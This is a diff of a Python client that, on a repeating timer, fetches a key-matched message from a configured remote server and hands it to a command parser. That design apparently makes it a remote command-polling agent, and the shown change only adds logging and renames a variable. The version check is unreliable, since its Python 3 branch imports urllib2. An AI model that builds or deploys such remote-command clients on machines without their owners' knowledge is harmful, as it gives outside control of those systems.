@@ -3,17 +3,19 @@
 
 from __future__ import print_function
 import os
-import os.path
-import base64
 import sys
+import base64
+import os.path
+import datetime
 import threading
-import constants as cfg
 import method as mtd
+import constants as cfg
 from commands import Commands
 
 # defining used python version.
 if cfg.PY_VERSION == 3:
     from urllib2 import urlopen
+
     raw_input = input
 elif cfg.PY_VERSION == 2:
     from urllib import urlopen
@@ -90,15 +92,22 @@ def parse_cmd(inp, key):
 
 
 def get_cmd():
-    cfg.COUNT += 1
+    cfg.COUNT += 1  # Count the total requests this session.
     key = mtd.get_key_info()
-    threading.Timer(cfg.INTERVAL, get_cmd).start()
-    print ("Request: #", cfg.COUNT)
+
+    threading.Timer(cfg.INTERVAL, get_cmd).start()  # Starts the timer loop to request data from the server.
+
+    logging = (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + " Request: #" + str(cfg.COUNT) +
+               " With a set interval of: " + str(cfg.INTERVAL))  # Sets string for logbook.
+    print(logging)  # To see the result in the terminal.
+    mtd.error_logging(logging)  # Function to put data into the log.
+
     content = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_GET, key))
-    str = content.read().strip()
-    if key == str:
+    imported_content = content.read().strip()
+
+    if key == imported_content:
         content = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_MESSAGE, key)).read().strip()
-        print('Key is in str', content)
+        print('Key is in imported_content', content)
         parse_cmd(content, key)
 
 
